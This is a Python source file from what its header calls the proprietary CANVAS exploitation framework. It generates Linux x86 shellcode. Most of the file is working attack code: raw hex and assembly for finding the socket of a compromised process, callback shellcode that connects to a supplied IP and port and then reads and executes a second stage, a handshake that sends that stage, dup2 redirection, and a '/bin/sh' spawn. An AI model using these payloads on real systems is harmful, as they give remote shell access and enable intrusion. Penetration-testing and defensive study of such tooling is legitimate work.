#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from exploitutils import *
from x86asm import *
import socket
from encoder import chunkedaddencoder
import shellcodeGenerator
findsckcode=""
#Size in bytes: 66
findsckcode+="\x8d\x7d\xd4\x83\xec\x2c\xbb\x00"
findsckcode+="\x03\x00\x00\xc7\x45\xd4\x10\x00"
findsckcode+="\x00\x00\x8d\x75\xd8\x8d\x76\x00"
findsckcode+="\x57\x56\x53\x87\xda\xb8\x66\x00"
findsckcode+="\x00\x00\xbb\x07\x00\x00\x00\x8d"
findsckcode+="\x4c\x24\x00\xcd\x80\x87\xda\x83"
findsckcode+="\xc4\x10\x83\xf8\x00\x75\x08\x66"
findsckcode+="\x81\x7d\xda\x21\x53\x74\x03\x4b"
findsckcode+="\x79\xd6"


SIGQUIT=11
SIGKILL=9


findsckcode2="""
normalizeespandebp:
        sub $0x50,%esp
        call geteip
geteip:
        pop %ebx
        //ebx now has our base!
        movl %ebx,%esp
        subl $0x1000,%esp
        //esp is now a nice value
        mov %esp,%ebp
        //ebp is now a nice value too! :>
donenormalize:
mainentrypoint:
        //address of j into edi
        lea    0xffffffd4(%ebp),%edi
        sub    $0x2c,%esp
        //i=256*3
        mov    $0x300,%ebx
        //j=0x10
        movl   $0x10,0xffffffd4(%ebp)
        lea    0xffffffd8(%ebp),%esi
        lea    (%esi),%esi
findsockloop:
        //&j
        push   %edi
        //&addr
        push   %esi
        //i
        push   %ebx
        //call get peername
        xchg    %ebx,%edx
        mov    $0x66,%eax
        mov    $0x7,%ebx
        lea    (%esp),%ecx
        int    $0x80
        xchg    %ebx,%edx
        add    $0x10,%esp
        cmp    $0,%eax
        jne continueloop
        //if we got here, we did got 0 (success) as the result of getpeername()
        cmpw   $0x5321,0xffffffda(%ebp)

//#ifdef DEBUG
//only one socket will return 0 for debug
//  jmp endsploit
//#else
je endsploit
//#endif

continueloop:
        //i--
        dec %ebx
        jns findsockloop
        //ebx is the socket handle here
endsploit:

readinandexec:
        movl $0x500,%edx
        mov %esp,%ecx
        //ebx is already correct
        movl $3,%eax
        int $0x80
        //ebx is still out file handle!
        jmp *%esp
endreadinandexec:

mycallzero:
        xorl %eax,%eax
        jmp *%eax
donecallzero:

signalcrash:
        push %eax
        push %ebx
        mov $0x0,%ebx
        mov $37,%eax
        int $0x80
        pop %ebx
        pop %eax

"""

domosdef=1
if domosdef:
    from MOSDEF import mosdef
    import time
    #lines=linuxGOcode_asm.split("\n")
    #print lines[14]
    #linuxGOcode2=mosdef.assemble(linuxGOcode_asm,"X86")
    #print "Length normal: %d Length MOSDEF %d"%(len(linuxGOcode),len(linuxGOcode2))

    #print "---"
    #print hexprint(linuxGOcode)
    #print "---"
    #print hexprint(linuxGOcode2)
    #print "---"
    #findsckcode2=mosdef.assemble(findsckcode2,"X86")
    #print hexprint(findsckcode2)
    #print "Length findsck %d findsck2 %d"%(len(findsckcode),len(findsckcode2))

    #time.sleep(10)
    #findsckcode=findsckcode2


def getfindsckcode(port):
    """
    Wants the stack normalized first...use getnormalize()
    Returns a shellocode that does the findsck getpeername tricks to 
    find the socket with the from-port of port. 
    OUTPUT: The socket we are using is stored in ebx
    """
    binPORT=chr((int(port)&0xff00) >> 8) + chr(int(port) & 0xff)
    
    newshellcode=findsckcode.replace("\x21\x53",binPORT)
    return newshellcode

def getcallbackcode(localip,localport, proc="x86"):
    """
    Standard callback shellcode for MOSDEF - normalizes the stack
    Does not do any encoding
    Only for x86 for now.
    """
    myshellcode=shellcodeGenerator.linux_X86()
    #you need a linux execve listener on the host and port...
    myshellcode.addAttr("Normalize Stack",[0])
    myshellcode.addAttr("connect",{"ipaddress" : localip, "port": localport})
    #myshellcode.addAttr("addcode",["movl %esi,%ebx\n"]) #read needs ebx to be the socket
    #myshellcode.addAttr("debugme",None)
    myshellcode.addAttr("read_and_exec",{"fdreg": "esi"})
    shellcode=myshellcode.get()
     
    return shellcode

def getGOcode():
    # this is called from tcpexploit
    # where encoding is taken care of
    
    sc = shellcodeGenerator.linux_X86()
    sc.addAttr("oldGOFindSock", None)
    shellcode = sc.get()
    return shellcode

def getNewGOcode():
    import shellcodeGenerator
    sc = shellcodeGenerator.linux_X86()
    sc.addAttr("GOFindSock", None)
    shellcode = sc.get()
    return shellcode

def getNewGOcodeWithShell():
    import shellcodeGenerator
    sc = shellcodeGenerator.linux_X86()
    sc.addAttr("GOFindSockWithShell", None)
    shellcode = sc.get()
    return shellcode


def doGOhandshake(s,secondstage=None):
    """
    returns 1 if it worked, 0 else
    """
    s.set_timeout(10)
    try:
        data=s.recv(256)
    except socket.error:
        return 0
    
    if data=="G":
        devlog("shellcode", "Received G")
        s.send("O")
        if secondstage==None:
            secondstage=getstage2()
        s.send(intel_order(len(secondstage)))
        s.send(secondstage)
        devlog("shellcode", "Sent second stage of length %d"%len(secondstage))
        return 1
    return 0
    
def getreadandexec():
    """
    INPUT: ebx must have the socket
    Reads in 0x500 bytes and executes it as shellcode
    OUTPUT: esp points to the start of the shellcode, the socket is still stored in %EBX
    """
    tmp=""

    tmp+=binstring("0xba	0x00	0x05	0x00	0x00	0x89	0xe1	0xb8");
    tmp+=binstring("0x03	0x00	0x00	0x00	0xcd	0x80");
    tmp+=jmp_reg("esp")
    #tmp=kill(0,SIGKILL)

    return tmp


def spawnshell():
    """
    Calls exec("/bin/sh")
    You probably want to dup2(0,1,2) before you do this
    """
    tmp=binstring("31 c0 50 68")+"//sh"+binstring("68")+"/bin"
    #tmp=binstring("31 c0 50 68")+"//sh"+binstring("68")+"/tmp"
    tmp+=binstring("89 e3 50 53 89 e1 99 b0 0b cd 80")
    return tmp

def getdup2ebx(fd2):
    """
    INPUT: Wants fd1 in ebx
    calls dup2 to set fd2 to fd1
    """
    tmp=binstring("31 c9") #xorl %ecx,%ecx
    tmp+=binstring("b1")+chr(fd2) #movb fd1, %cl
    tmp+=binstring("b0 3f") #movb $0x3f,%al
    tmp+=binstring("cd 80") #int $80
    return tmp
    

def getcommonfindsckcode(port):
    tmp=""
    #tmp+=kill(0,SIGQUIT)
    #tmp+=jmpshort(-2)
    tmp+=normalizeespebp()
    tmp+=getfindsckcode(port)
    #tmp+=getreadandexec()
    tmp+=getstage2()
    return tmp
    
def getstage2():
    tmp=""
    crash=0
    tmp+=getdup2ebx(0)
    tmp+=getdup2ebx(1)
    tmp+=getdup2ebx(2)
    if crash:
        tmp+=xorl_regreg("eax","eax")
        tmp+=jmp_reg("eax")
    tmp+=spawnshell()
    return tmp

def getcommonstage2():
    #need full size
    fullstr="A"*0x500
    tmp=""
    tmp+=normalizeespebp()
    tmp+=getdup2ebx(0)
    tmp+=getdup2ebx(1)
    tmp+=getdup2ebx(2)
    tmp+=spawnshell()
    tmp=stroverwrite(fullstr,tmp,0)
    return tmp

def kill(pid,sig):
    """
    Calls kill(pid,sig)
    Requires a working stack
    """
    tmp=""
    tmp+=push_reg("eax")
    tmp+=push_reg("ebx")
    tmp+=movl_immreg(0,"ebx")
    tmp+=movl_immreg(37,"eax")
    tmp+=int_imm(0x80)
    tmp+=pop_reg("ebx")
    tmp+=pop_reg("eax")
    return tmp

    
   
